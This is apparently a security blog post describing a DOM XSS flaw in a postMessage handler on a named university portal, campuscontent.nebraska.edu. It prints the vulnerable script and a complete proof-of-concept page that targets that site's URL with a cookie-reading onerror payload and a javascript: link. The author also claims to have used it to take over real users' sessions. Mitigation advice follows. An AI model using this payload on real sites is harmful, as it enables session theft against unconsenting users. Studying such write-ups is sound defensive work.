+++
date = '2025-06-28'
draft = false
title = 'Hijacking Sessions with postMessage: The Silent DOM XSS Threat'
tags= ["xss", "postmessage", "dom-security", "web-security", "session-hijacking"]
+++
<!---**Tags**: weblogic, alibaba, cve-2017-3506, command-injection, oracle, middleware  
--->
*Discovery Date: 18<sup>th</sup> May 2025*  

{{< figure src="/img/1.png" alt="Vulnerability Diagram" caption="Credits to dall-efree.com" >}}



## Introduction
Imagine a bank teller who accepts withdrawal slips from **anyone** without checking IDs. A hacker slips in a fake note saying, “Give all money to me,” and the teller blindly obeys.


{{< figure src="/img/2.gif" alt="gif" caption="Credits to: tenor.com" >}}

That’s exactly what happens in this **DOM XSS vulnerability** — where a website **blindly trusts messages** from any sender, allowing attackers to inject malicious scripts.

In this setup, I’ll discuss how I was able to execute malicious script by exploiting the unsafe `postMessage` implementation.

## Understanding postMessage
What is `postMessage`?

`postMessage` is a javascript method that lets different windows/frames **communicate securely** — but only if used correctly.

> Read more about postMessage [here](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage).

### How it should work:

```javascript
// Parent window (trusted.com) sends a message  
childWindow.postMessage("Hello!", "https://trusted-receiver.com");  

// Child window (trusted-receiver.com) validates the sender  
window.addEventListener("message", (event) => {  
  if (event.origin !== "https://trusted.com") return; // Security check  
  console.log(event.data); // "Hello!"  
});  

```

### How it failed in my target:

The website **missed two critical** security steps:

* No `event.origin` check → Accepted messages from any domain.
{{< figure src="/img/3.png" alt="poc" caption="Fig: Vulnerable Snippet" >}}

* Unsafe `innerHTML` usage → Executed attacker-controlled scripts.  Result: A single malicious `postMessage` method could compromise user sessions.

## The Hack

After hours of reconnaissance across `*.nebraska.edu` domains, I stumbled upon `campuscontent.nebraska.edu` — a seemingly ordinary university portal with a login panel. What made it extraordinary was what I found when I:
1. Opened Chrome DevTools (F12) and navigated to the Sources tab
2. Checked Event Listeners → Message events
3. Spotted the dangerous implementation:

{{< figure src="/img/4.png" alt="poc" caption="Fig: Vulnerable Script" >}}

Here is the break down of the function:

```javascript
// Vulnerable message handler - accepts postMessage events from ANY origin
function receiveMessage(event) {
    // Debug logging (safe, but reveals implementation details)
    console.log(event);
    
    // Gets container element where dynamic links will be added
    var linksDiv = document.getElementById('login-other-container');
    
    // UNSAFE CLICK HANDLER
    // Sends URL attribute back to parent window WITHOUT origin validation
    var onclickFunction = function(event, tt) {
        parent.postMessage(event.currentTarget.getAttribute('url'), "*"); // Wildcard ("*") allows sending to ANY origin
    };

    // Processes each item in the message data array
    for (i = 0; i < event.data.length; i++) {
        
        // Case 1: UNMC Login Link
        if(event.data[i].href.includes('https://idp.unmc.edu')){
            var unoLinkElement = document.getElementById('login-netid');
            unoLinkElement.setAttribute('url', event.data[i].href); // No URL validation
            unoLinkElement.onclick = onclickFunction; // Inherits insecure postMessage
        } 
        
        // Case 2: Nebraska University Login
        else if (event.data[i].href.includes('https://fed.nebraska.edu')) {
            var trueYouLinkElement = document.getElementById('login-nuid');
            trueYouLinkElement.setAttribute('url', event.data[i].href);
            trueYouLinkElement.onclick = onclickFunction;

            var trueYouGuestLinkElement = document.getElementById('login-guest');
            trueYouGuestLinkElement.setAttribute('url', event.data[i].href);
            trueYouGuestLinkElement.onclick = onclickFunction;
        } 
        
        // Case 3: MOST DANGEROUS PATH - Dynamic Content Injection
        else {
            var element = document.createElement('a');
            var tmpElement = document.createElement('div');
            
            // Direct innerHTML injection
            tmpElement.innerHTML = event.data[i].html; // Executes arbitrary HTML/JS
            
            // Processes injected HTML to create thumbnail elements
            var imageElements = tmpElement.getElementsByTagName('img');
            var titleElements = tmpElement.getElementsByClassName('campus-title');
            
            var thumbnailElement = document.createElement('div');
            thumbnailElement.className += " thumbnail";
            
            if(imageElements.length && titleElements.length){
                // Builds UI components from untrusted HTML
                thumbnailElement.appendChild(imageElements[0]);
                
                var textElement = document.createElement('div');
                textElement.className += " caption";
                textElement.appendChild(titleElements[0]);
                
                thumbnailElement.appendChild(textElement);
                element.appendChild(thumbnailElement);
                element.className += 'col-xs-12 col-md-3 col-sm-6';
                
                // UNSAFE ATTRIBUTES
                element.setAttribute('href', "#");
                element.setAttribute('url', event.data[i].href); // Could be javascript: URL
                element.onclick = onclickFunction; // Inherits wildcard postMessage
                
                // Adds the potentially malicious element to DOM
                linksDiv.appendChild(element);
            }
        }
    }
}

// MAIN VULNERABILITY ENTRY POINT
// Listens for messages from ANY origin (no validation)
window.addEventListener("message", receiveMessage, false); // Missing origin parameter
```

## Crafting Payload 

Now in order to demonstrate the risk, I created a script that sends malicious data via `postMessage` when the target page loads:

```javascript
<!DOCTYPE html>
<html>
<head>
    <title>Fake Login Portal</title>
    <script>
        function exploit() {
            // The vulnerable page 
            const targetUrl = "https://campuscontent.nebraska.edu/UNMC/pslogon/csprdnu/index.html?host=myrecords.nebraska.edu&site=NBM#other-logins"; 
            const win = window.open(targetUrl); 
            
            // Wait for the target page to load, then send malicious payload
            setTimeout(() => {
                const maliciousPayload = [
                    {
                        href: "javascript:alert('XSS via href!')",
                        html: "<img src=x onerror='alert(`Stolen Cookies: ${document.cookie}`)'>"
                    },
                ];

                // Send the payload via postMessage (no origin check)
                win.postMessage(maliciousPayload, "*"); 
            }, 2000);
        }
    </script>
</head>
<body>  
    <h1>Click to Exploit</h1>
    <button onclick="exploit()">Start Attack</button>
</body>
</html>
```

The vulnerable code uses `innerHTML = event.data[i].html`, which parses the string as HTML (not just text) and executes the `onerror` script in the victim’s security context.

{{< figure src="/img/5.png" alt="Sequence Diagram" caption="Fig: Sequence Diagram" >}}   

## Exploiting the Vulnerability 

Save the above script in an html file and open it in a browser.

{{< figure src="/img/6.png" alt="Payload" caption="Fig: Payload" >}}
{{< figure src="/img/7.png" alt="HTML page" caption="Fig: HTML page" >}}
Next click on “Start Attack” and boooom……..
{{< figure src="/img/8.png" alt="Exploite POC" caption="Fig: Exploite POC" >}}

This led me to grab the session token of authenticated users by sending them the crafted payload and getting unauthorized access to their active sessions.

## The Golden Rules to Prevent This Attack: 🦺

### Validate every message

* Check `event.origin` only accept messages from trusted domains.
* Treat unexpected senders like a stranger offering candy.

### Never inject raw HTML

* Assume all dynamic content is hostile — sanitize or use safe alternatives like `textContent`.

### Set cookie attributes properly

* Always configure cookies with secure attributes (HttpOnly, Secure, SameSite). This ensures that even if a DOM XSS vulnerability exists, attackers cannot steal sensitive session cookies via javascript.

<hr>

Security isn’t magic — it’s just **not trusting strangers**. Validate inputs, sanitize outputs, and sleep like a baby while hackers rage outside your fortified code. 🔒

Connect with me on [LinkedIn](https://linkedin.com/in/the-genetic) and also on [Twitter](https://x.com/DipeshPaul19)

**Stay paranoid, stay safe. 🚀**

*Thank you for reading! If my content has helped you in any way, consider buying me a coffee to show your support [here](https://buymeacoffee.com/thegenetic)!*

(Mic drop, end blog.)
{{< figure src="/img/1.gif" alt="gif" caption="Credits to: tenor.com" >}}